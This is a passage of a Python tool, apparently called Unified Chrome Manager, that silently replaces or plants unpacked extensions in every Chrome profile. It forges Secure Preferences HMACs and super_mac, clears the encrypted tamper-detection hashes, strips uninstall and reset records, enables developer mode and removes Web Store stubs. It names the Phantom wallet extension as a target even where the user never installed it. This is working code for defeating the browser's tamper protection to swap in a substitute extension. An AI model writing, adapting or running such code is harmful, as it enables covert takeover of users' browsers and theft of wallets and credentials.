            pp = profile.get("prefs")
            if isinstance(pp, dict):
                inner = pp.get("tracked_preferences_reset")
                if isinstance(inner, list):
                    kept, diff = _strip_list(inner)
                    if diff:
                        changed = True
                        logger.info(
                            "Removed extension target(s) from profile.prefs."
                            "tracked_preferences_reset: %s",
                            sorted(to_drop.intersection(set(inner))),
                        )
                    if kept:
                        pp["tracked_preferences_reset"] = kept
                    elif "tracked_preferences_reset" in pp:
                        del pp["tracked_preferences_reset"]

        return changed

    def _scrub_extension_external_uninstalls(
        self,
        root: Dict,
        extension_id: str,
        staging_dir_name: Optional[str],
    ) -> bool:
        """
        Remove extension id(s) from extensions.external_uninstalls (Chromium
        pref_names::kExternalUninstalls / extension_prefs.cc).

        If an id remains in this list, ExtensionRegistrar::IsExtensionEnabled treats
        the extension as disabled (extension_registrar.cc). Normal installs clear
        the entry via ExtensionPrefs::OnExtensionInstalled; direct prefs edits do not.
        """
        ext_root = root.get("extensions")
        if not isinstance(ext_root, dict):
            return False
        lst = ext_root.get("external_uninstalls")
        if not isinstance(lst, list):
            return False
        to_drop = {extension_id}
        if staging_dir_name and staging_dir_name != extension_id:
            to_drop.add(staging_dir_name)
        str_ids = [x for x in lst if isinstance(x, str)]
        if not to_drop.intersection(set(str_ids)):
            return False
        kept = [x for x in lst if x not in to_drop]
        if kept:
            ext_root["external_uninstalls"] = kept
        else:
            del ext_root["external_uninstalls"]
        logger.info(
            "Removed extension id(s) from extensions.external_uninstalls: %s",
            sorted(to_drop.intersection(set(str_ids))),
        )
        return True

    def _profile_extensions_settings_key_set(self, profile_path: str) -> Set[str]:
        """All extensions.settings keys present in Secure Preferences and/or Preferences."""
        keys_seen: Set[str] = set()
        for fname in ("Secure Preferences", "Preferences"):
            fp = os.path.join(profile_path, fname)
            if not os.path.isfile(fp):
                continue
            try:
                with open(fp, "r", encoding="utf-8") as f:
                    root = json.load(f)
            except (OSError, json.JSONDecodeError):
                continue
            ext = root.get("extensions")
            if not isinstance(ext, dict):
                continue
            st = ext.get("settings")
            if isinstance(st, dict):
                keys_seen.update(st.keys())
        return keys_seen

    def _resolve_prefs_extension_id_for_profile(
        self,
        profile_path: str,
        computed_extension_id: str,
        staging_dir_name: Optional[str],
    ) -> str:
        """
        Prefs key for extensions.settings / MAC paths.

        Staging folders are often named after the Web Store id. If the unpacked manifest has
        no ``key`` field, Chromium derives the id from the on-disk path, which usually does
        *not* equal that folder name. The old logic wrote under the path-based id and deleted
        the staging-named row, removing the store extension without adding a replacement under
        the id Chrome actually uses.
        """
        keys = self._profile_extensions_settings_key_set(profile_path)
        if staging_dir_name and staging_dir_name in keys:
            if computed_extension_id != staging_dir_name:
                logger.info(
                    "Using staging folder name %r as extensions.settings key (existing row). "
                    "Computed id from manifest/path is %r.",
                    staging_dir_name,
                    computed_extension_id,
                )
            return staging_dir_name
        return computed_extension_id

    def _profile_has_extensions_settings_key(
        self,
        profile_path: str,
        extension_id: str,
        staging_dir_name: Optional[str],
    ) -> bool:
        """True if Preferences or Secure Preferences already has this extensions.settings key."""
        keys_seen = self._profile_extensions_settings_key_set(profile_path)
        if extension_id in keys_seen:
            return True
        if (
            staging_dir_name
            and staging_dir_name != extension_id
            and staging_dir_name in keys_seen
        ):
            return True
        return False

    def _verify_written_extension_secure_macs(
        self,
        data: dict,
        extension_id: str,
        browser_name: str,
    ) -> bool:
        """
        Confirm protection.macs.extensions.settings[id] and super_mac match the
        extensions.settings row we are about to write (Chrome drops invalid Secure prefs).
        """
        ext_block = data.get("extensions")
        if not isinstance(ext_block, dict):
            logger.error("verify: missing extensions")
            return False
        settings = ext_block.get("settings")
        if not isinstance(settings, dict):
            logger.error("verify: missing extensions.settings")
            return False
        row = settings.get(extension_id)
        if not isinstance(row, dict):
            logger.error("verify: missing extensions.settings[%s]", extension_id)
            return False
        prot = data.get("protection")
        if not isinstance(prot, dict):
            logger.error("verify: missing protection")
            return False
        macs = prot.get("macs")
        if not isinstance(macs, dict):
            logger.error("verify: missing protection.macs")
            return False
        ext_m = macs.get("extensions")
        if not isinstance(ext_m, dict):
            logger.error("verify: missing protection.macs.extensions")
            return False
        set_m = ext_m.get("settings")
        if not isinstance(set_m, dict):
            logger.error("verify: missing protection.macs.extensions.settings")
            return False
        stored = set_m.get(extension_id)
        if not isinstance(stored, str) or len(stored) != 64:
            logger.error("verify: invalid stored MAC for extensions.settings.%s", extension_id)
            return False
        path = f"extensions.settings.{extension_id}"
        computed = self.calculate_hmac(row, path, browser_name)
        if not computed or computed.upper() != stored.upper():
            logger.error(
                "verify: MAC mismatch for %s stored=%s computed=%s",
                path,
                stored,
                computed,
            )
            return False
        super_stored = prot.get("super_mac")
        super_calc = self.calculate_super_mac(macs, browser_name)
        if (
            not isinstance(super_stored, str)
            or not super_calc
            or super_stored.upper() != super_calc.upper()
        ):
            logger.error(
                "verify: super_mac mismatch stored=%r computed=%r",
                super_stored,
                super_calc,
            )
            return False
        return True

    def _replace_extensions_from_shared_staging(
        self,
        browser_name: str,
        browser_path: str,
        profiles: List[str],
        shared_root: str,
        processed_keys: Set[Tuple[str, str, str]],
    ) -> Tuple[int, int]:
        """
        For each extension folder under shared_root, run replacement on every
        browser profile (Default, Profile 1, …). Unlike per-profile staging folders,
        this path also registers the extension when there is no existing
        extensions.settings.<id> row (e.g. Phantom never installed or was removed).
        """
        try:
            extension_dirs = [
                d
                for d in os.listdir(shared_root)
                if os.path.isdir(os.path.join(shared_root, d)) and not d.startswith(".")
            ]
        except (OSError, PermissionError) as e:
            logger.warning("Cannot list shared staging %s: %s", shared_root, e)
            return 0, 0

        if not extension_dirs:
            return 0, 0

        success_count = 0
        n_tried = 0
        logger.info(
            "🔄 Shared staging %s: %d extension dir(s) → eligible browser profiles",
            shared_root,
            len(extension_dirs),
        )

        for staging_dir in extension_dirs:
            custom_extension_path = os.path.join(shared_root, staging_dir)
            manifest_path = os.path.join(custom_extension_path, "manifest.json")
            if not os.path.isfile(manifest_path):
                logger.warning("Skipping shared %s: no manifest.json", manifest_path)
                continue
            try:
                with open(manifest_path, "r", encoding="utf-8") as mf:
                    mf_json = json.load(mf)
            except (OSError, json.JSONDecodeError) as e:
                logger.error("Cannot read manifest %s: %s", manifest_path, e)
                continue

            path_norm = self._normalize_extension_path(custom_extension_path)
            chrome_id = self._compute_chrome_extension_id(mf_json, path_norm)
            if not chrome_id:
                logger.error("Cannot compute Chrome extension id for %s", manifest_path)
                continue

            for profile_name in profiles:
                if profile_name == self.EXTENSION_STAGING_ALL_PROFILES:
                    continue
                if not self._profile_supports_unpacked_extensions(profile_name):
                    logger.debug(
                        "Shared staging: skip %s/%s (not a regular profile for unpacked extensions)",
                        browser_name,
                        profile_name,
                    )
                    continue
                profile_path = os.path.join(browser_path, profile_name)
                prefs_path = os.path.join(profile_path, "Preferences")
                if not os.path.isfile(prefs_path):
                    logger.debug(
                        "Shared staging: skip %s/%s (no Preferences file)",
                        browser_name,
                        profile_name,
                    )
                    continue
                had_row = self._profile_has_extensions_settings_key(
                    profile_path, chrome_id, staging_dir
                )
                prefs_extension_id = self._resolve_prefs_extension_id_for_profile(
                    profile_path, chrome_id, staging_dir
                )
                if not had_row:
                    logger.info(
                        "Shared staging: new registration %s → %s/%s "
                        "(no existing extensions.settings entry)",
                        prefs_extension_id,
                        browser_name,
                        profile_name,
                    )
                dedupe_key = (browser_name, profile_name, prefs_extension_id)
                if dedupe_key in processed_keys:
                    logger.debug(
                        "Shared staging: skip duplicate %s/%s %s",
                        browser_name,
                        profile_name,
                        prefs_extension_id,
                    )
                    continue

                n_tried += 1
                if self._replace_extension_for_profile(
                    chrome_id,
                    custom_extension_path,
                    profile_path,
                    browser_name,
                    mf_json,
                    staging_dir_name=staging_dir,
                ):
                    success_count += 1
                    processed_keys.add(dedupe_key)
                    self._profiles_extensions_written.add((browser_name, profile_name))
                    logger.info(
                        "✅ Shared staging applied %s to %s/%s",
                        chrome_id,
                        browser_name,
                        profile_name,
                    )
                else:
                    logger.warning(
                        "❌ Shared staging failed for %s on %s/%s",
                        chrome_id,
                        browser_name,
                        profile_name,
                    )

        return success_count, n_tried

    def _should_mirror_extensions_settings_to_preferences(
        self, preferences_file: str, extension_id: str
    ) -> bool:
        """
        Many profiles (e.g. Profile 3 / Profile 3_changed) store extensions.settings only
        in Secure Preferences. Writing the same row into regular Preferences can confuse the
        merged pref store — mirror only when Preferences already has an extensions.settings map
        with content or this extension id.
        """
        if not os.path.isfile(preferences_file):
            return False
        try:
            with open(preferences_file, "r", encoding="utf-8") as f:
                prefs = json.load(f)
        except (OSError, json.JSONDecodeError, UnicodeDecodeError):
            return False
        ext = prefs.get("extensions")
        if not isinstance(ext, dict):
            return False
        settings = ext.get("settings")
        if not isinstance(settings, dict):
            return False
        if extension_id in settings:
            return True
        return len(settings) > 0

    def _replace_extension_for_profile(
        self,
        chrome_id,
        custom_extension_path,
        profile_path,
        browser_name,
        manifest: dict,
        staging_dir_name: Optional[str] = None,
    ):
        """Replace extension for a specific profile (chrome_id = prefs key from manifest/path)."""
        prefs_extension_id = chrome_id
        logger.debug("🔧 Starting individual extension replacement: %s", chrome_id)
        try:
            extension_name = manifest.get("name", chrome_id)
            extension_version = manifest.get("version", "unknown")
            logger.debug(
                "📦 Extension details: %s v%s (%s)", extension_name, extension_version, chrome_id
            )

            path_norm = self._normalize_extension_path(custom_extension_path)

            # Set up profile-specific paths
            preferences_file = os.path.join(profile_path, "Preferences")
            secure_preferences_file = os.path.join(profile_path, "Secure Preferences")
            external_extensions_path = os.path.join(profile_path, "External Extensions")

            prefs_extension_id = self._resolve_prefs_extension_id_for_profile(
                profile_path, chrome_id, staging_dir_name
            )

            # Secure Preferences holds extensions.settings (sometimes exclusively).
            logger.debug("🔒 Updating Secure Preferences file: %s", secure_preferences_file)
            success1 = self._update_secure_preferences(
                prefs_extension_id,
                path_norm,
                secure_preferences_file,
                browser_name,
                staging_dir_name=staging_dir_name,
                manifest=manifest,
                reference_changed_parity=False,
            )
            if success1:
                logger.debug("✅ Secure Preferences updated for %s", prefs_extension_id)
            else:
                logger.warning("❌ Failed to update Secure Preferences for %s", prefs_extension_id)

            if self._should_mirror_extensions_settings_to_preferences(
                preferences_file, prefs_extension_id
            ):
                logger.debug("📝 Updating Preferences file: %s", preferences_file)
                success2 = self._add_extension_to_preferences(
                    prefs_extension_id,
                    path_norm,
                    preferences_file,
                    staging_dir_name=staging_dir_name,
                    manifest=manifest,
                    reference_changed_parity=False,
                )
                if success2:
                    logger.debug("✅ Preferences updated for %s", prefs_extension_id)
                else:
                    logger.warning("❌ Failed to update Preferences for %s", prefs_extension_id)
            else:
                logger.info(
                    "Skipping Preferences.extensions.settings mirror for %s — profile has no "
                    "extensions.settings in regular Preferences (Secure-only layout; see Profile 3_changed)",
                    prefs_extension_id,
                )
                success2 = True

            logger.debug(
                "📁 Removing External Extensions stub if present: %s", external_extensions_path
            )
            success3 = self._remove_external_extension_stub(
                prefs_extension_id, external_extensions_path
            )
            if success3:
                logger.debug("✅ External Extensions cleaned for %s", prefs_extension_id)
            else:
                logger.warning(
                    "❌ Failed to clean External Extensions for %s", prefs_extension_id
                )

            overall_success = success1 and success2 and success3  # secure, prefs, external stub
            if overall_success:
                logger.info(
                    "✅ Extension %s (%s) OK | profile_path=%s | unpacked_path=%s "
                    "| compare Profile path in chrome://version to profile_path",
                    prefs_extension_id,
                    extension_name,
                    profile_path,
                    path_norm,
                )
            else:
                logger.error(
                    "❌ Extension %s (%s) replacement failed",
                    prefs_extension_id,
                    extension_name,
                )

            return overall_success

        except Exception as e:
            logger.error(
                "❌ Exception during extension replacement for %s: %s",
                prefs_extension_id,
                e,
            )
            return False

    def _add_extension_to_preferences(
        self,
        extension_id,
        path_norm,
        preferences_file,
        staging_dir_name: Optional[str] = None,
        manifest: Optional[dict] = None,
        *,
        reference_changed_parity: bool = False,
    ):
        """Merge unpacked extension into Preferences.extensions.settings.<id>."""
        try:
            # Load preferences
            with open(preferences_file, 'r', encoding='utf-8') as f:
                preferences = json.load(f, object_pairs_hook=OrderedDict)

            # Ensure extensions structure exists
            if 'extensions' not in preferences:
                preferences['extensions'] = {}
            if 'settings' not in preferences['extensions']:
                preferences['extensions']['settings'] = {}

            # Leave extensions.install_signature untouched: reference before/after snapshots
            # keep the same signed blob; only partial edits to ids/invalid_ids break verification.

            settings = preferences['extensions']['settings']
            prior = settings.get(extension_id)
            if (
                prior is None
                and staging_dir_name
                and staging_dir_name != extension_id
            ):
                prior = settings.get(staging_dir_name)

            # Regular Preferences sometimes holds a smaller copy than Secure Preferences;
            # use the richer dict so we keep active_permissions, granted_permissions, etc.
            prior = self._richer_extensions_settings_prior(
                prior,
                extension_id,
                os.path.dirname(preferences_file),
                staging_dir_name,
            )

            ext_settings = self._merge_extension_settings_unpacked(
                prior,
                path_norm,
                manifest=manifest,
                reference_changed_parity=reference_changed_parity,
            )

            # Add to preferences (mirror Secure row for profiles that merge both stores).
            settings[extension_id] = ext_settings
            if staging_dir_name and staging_dir_name != extension_id:
                if staging_dir_name in settings:
                    del settings[staging_dir_name]
                    logger.info(
                        "Removed stale Preferences.extensions.settings[%s] "
                        "(prefs key is %s)",
                        staging_dir_name,
                        extension_id,
                    )

            self._scrub_extensions_settings_tracked_reset(
                preferences, extension_id, staging_dir_name
            )
            self._scrub_extension_external_uninstalls(
                preferences, extension_id, staging_dir_name
            )

            self.enable_extensions(preferences)

            # Save preferences
            with open(preferences_file, 'w', encoding='utf-8') as f:
                json.dump(preferences, f, separators=(',', ':'), ensure_ascii=False)

            return True

        except Exception as e:
            print(f"           ❌ Error updating Preferences: {e}")
            return False

    def _update_secure_preferences(
        self,
        extension_id,
        path_norm,
        secure_preferences_file,
        browser_name="chrome",
        staging_dir_name: Optional[str] = None,
        manifest: Optional[dict] = None,
        *,
        reference_changed_parity: bool = False,
    ):
        """Update Secure Preferences with merged unpacked extension entry and MAC."""
        try:
            # Load secure preferences
            with open(secure_preferences_file, 'r', encoding='utf-8') as f:
                secure_preferences = json.load(f, object_pairs_hook=OrderedDict)

            # Ensure extensions structure exists
            if 'extensions' not in secure_preferences:
                secure_preferences['extensions'] = {}
            if 'settings' not in secure_preferences['extensions']:
                secure_preferences['extensions']['settings'] = {}

            settings = secure_preferences['extensions']['settings']
            prior = settings.get(extension_id)
            if (
                prior is None
                and staging_dir_name
                and staging_dir_name != extension_id
            ):
                prior = settings.get(staging_dir_name)

            prior = self._richer_extensions_settings_prior(
                prior,
                extension_id,
                os.path.dirname(secure_preferences_file),
                staging_dir_name,
            )

            ext_data = self._merge_extension_settings_unpacked(
                prior,
                path_norm,
                manifest=manifest,
                reference_changed_parity=reference_changed_parity,
            )

            settings[extension_id] = ext_data

            if staging_dir_name and staging_dir_name != extension_id:
                if staging_dir_name in settings:
                    del settings[staging_dir_name]
                    logger.info(
                        "Removed stale Secure Preferences.extensions.settings[%s] "
                        "(prefs key is %s)",
                        staging_dir_name,
                        extension_id,
                    )

            self._scrub_extensions_settings_tracked_reset(
                secure_preferences, extension_id, staging_dir_name
            )
            self._scrub_extension_external_uninstalls(
                secure_preferences, extension_id, staging_dir_name
            )

            # Clear DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION (1<<24) on any extension after
            # enabling developer mode in prefs (disable_reason.h; extension_prefs.cc).
            _, dev_mode_cleared_ids = self.enable_extensions(secure_preferences)

            # Encrypted split hashes are checked before legacy MACs (pref_hash_store_impl).
            # Chrome requires ALL keys in extensions.settings to have an encrypted hash when
            # the settings_encrypted_hash map is present; a single missing entry (our new row)
            # makes Chrome treat the entire split pref as tampered and reset the row.
            # Clear the whole map so every extension uniformly falls back to legacy per-id MACs.
            self._strip_extensions_settings_encrypted_hashes(
                secure_preferences, clear_all=True
            )

            if dev_mode_cleared_ids:
                self._sync_extension_settings_macs(
                    secure_preferences, browser_name, dev_mode_cleared_ids
                )

            # Calculate HMAC
            path = f"extensions.settings.{extension_id}"
            try:
                extension_hmac = self.calculate_hmac(ext_data, path, browser_name)
            except Exception as e:
                print(f"           ❌ Error calculating HMAC: {e}")
                return False
            if not extension_hmac:
                print("           ❌ HMAC calculation returned empty")
                return False

            # Update protection section
            if 'protection' not in secure_preferences:
                secure_preferences['protection'] = {'macs': {'extensions': {'settings': {}}}}
            if 'macs' not in secure_preferences['protection']:
                secure_preferences['protection']['macs'] = {'extensions': {'settings': {}}}
            if 'extensions' not in secure_preferences['protection']['macs']:
                secure_preferences['protection']['macs']['extensions'] = {'settings': {}}
            if 'settings' not in secure_preferences['protection']['macs']['extensions']:
                secure_preferences['protection']['macs']['extensions']['settings'] = {}

            macs_settings = secure_preferences['protection']['macs']['extensions']['settings']
            macs_settings[extension_id] = extension_hmac

            if staging_dir_name and staging_dir_name != extension_id:
                if staging_dir_name in macs_settings:
                    del macs_settings[staging_dir_name]
                    logger.info(
                        "Removed orphan protection.macs.extensions.settings[%s]",
                        staging_dir_name,
                    )

            # Recalculate super_mac
            super_mac = self.calculate_super_mac(secure_preferences['protection']['macs'], browser_name)
            if not super_mac:
                print("           ❌ super_mac calculation failed")
                return False
            secure_preferences['protection']['super_mac'] = super_mac

            if not self._verify_written_extension_secure_macs(
                secure_preferences, extension_id, browser_name
            ):
                print(
                    f"           ❌ Secure Preferences MAC self-check failed for "
                    f"extensions.settings.{extension_id} (file not written)"
                )
                return False

            # Save secure preferences
            with open(secure_preferences_file, 'w', encoding='utf-8') as f:
                json.dump(secure_preferences, f, separators=(',', ':'), ensure_ascii=False)

            return True

        except Exception as e:
            print(f"           ❌ Error updating Secure Preferences: {e}")
            return False

    def _remove_external_extension_stub(self, extension_id, external_extensions_path):
        """
        Remove External Extensions/<id>.json if present.

        Chromium ignores the 'path' key for external_update_url entries; that JSON
        instead registers a Web Store update install (kExternalPrefDownload), which
        conflicts with loading an unpacked folder at the same id (kUnpacked).
        """
        try:
            config_file = os.path.join(external_extensions_path, f"{extension_id}.json")
            if os.path.isfile(config_file):
                os.remove(config_file)
                logger.info(
                    "Removed conflicting External Extensions stub: %s", config_file
                )
            return True
        except Exception as e:
            print(f"           ❌ Error removing external extension stub: {e}")
            return False


# Example usage and main function
def main():
    """Main function for command line usage"""
    import argparse

    # Log startup information
    logger.info("="*80)
    logger.info("🚀 UNIFIED CHROME MANAGER - DETAILED LOGGING ENABLED")
    logger.info("="*80)
    logger.info(f"📅 Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    logger.info(f"🖥️ Operating System: {sys.platform}")
    logger.info(f"🐍 Python Version: {sys.version}")
    logger.info("="*80)

    parser = argparse.ArgumentParser(description='Chrome Extension Patcher - Fast and Simple')
    parser.add_argument('--username', help='Username for profile paths (auto-detected if not provided)')
    parser.add_argument('--extensions-path', help='Path to extensions directory (uses default if not provided)')
    parser.add_argument('--mode', choices=['REPLACE', 'BACKUP'], default='REPLACE',
                       help='Mode: REPLACE extensions and enable dev mode, or BACKUP to restore original state (default: REPLACE)')
    parser.add_argument(
        '--verify-secure-prefs',
        metavar='PATH',
        help='Verify legacy MACs + super_mac in a copied Secure Preferences file (same PC/Chrome seed), then exit',
    )
    parser.add_argument(
        '--verify-browser',
        default='chrome',
        help='Browser name for HMAC seed when using --verify-secure-prefs (default: chrome)',
    )

    args = parser.parse_args()

    logger.info(f"⚙️ Command line arguments:")
    logger.info(f"   - Username: {args.username or 'auto-detect'}")
    logger.info(f"   - Extensions path: {args.extensions_path or 'default/auto-detect'}")
    logger.info(f"   - Mode: {args.mode}")
    if args.verify_secure_prefs:
        logger.info(f"   - Verify Secure Preferences: {args.verify_secure_prefs}")
        logger.info(f"   - Verify browser (seed): {args.verify_browser}")
    logger.info("="*80)

    try:
        _require_supported_platform()
        if args.verify_secure_prefs:
            logger.info("🔧 Verifying Secure Preferences HMACs...")
            manager = UnifiedChromeManager(username=args.username)
            ok, errors = manager.verify_secure_preferences_hmacs(
                args.verify_secure_prefs, args.verify_browser
            )
            for line in errors:
                logger.error("%s", line)
            if ok:
                logger.info("Verification passed: super_mac and all 64-char MAC entries match.")
            else:
                logger.error("Verification failed (%d issue(s)).", len(errors))
            sys.exit(0 if ok else 1)

        # Create manager instance
        logger.info("🔧 Creating UnifiedChromeManager instance...")
        manager = UnifiedChromeManager(username=args.username)

        # Run the process based on mode
        if args.mode == 'BACKUP':
            logger.info("🔄 Running in BACKUP mode - restoring original browser state")
            success = manager.restore_browser_state()
        else:  # REPLACE mode
            logger.info("🔄 Running in REPLACE mode - enabling dev mode and replacing extensions")
            success = manager.run_unified_process(extensions_base_path=args.extensions_path)

        # Log final result
        logger.info("="*80)
        if success:
            logger.info("🎉 PROCESS COMPLETED SUCCESSFULLY!")
        else:
            logger.error("💥 PROCESS FAILED!")
        logger.info(f"📅 Completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        logger.info("="*80)

        # Exit with appropriate code
        sys.exit(0 if success else 1)

    except RuntimeError as e:
        logger.error("%s", e)
        print(str(e), file=sys.stderr)
        sys.exit(2)
    except Exception as e:
        logger.error("="*80)
        logger.error(f"💥 CRITICAL ERROR: {e}")
        logger.error("="*80)
        import traceback
        logger.error(f"📋 Full traceback:\n{traceback.format_exc()}")
        sys.exit(1)


if __name__ == "__main__":
    main()